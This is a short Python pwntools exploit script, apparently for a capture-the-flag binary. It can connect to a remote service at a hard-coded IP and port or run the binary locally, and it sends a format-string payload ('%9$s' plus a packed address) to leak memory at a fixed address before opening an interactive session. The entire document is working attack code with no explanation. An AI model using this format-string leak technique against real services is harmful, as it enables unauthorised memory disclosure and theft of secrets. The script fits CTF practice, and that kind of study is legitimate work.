from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.71.207.70',5337)
    else:
        return process(e.path)


p = start()
chain = b'%9$s    '+p64(0x4040a0)
p.sendline(chain)
p.interactive()
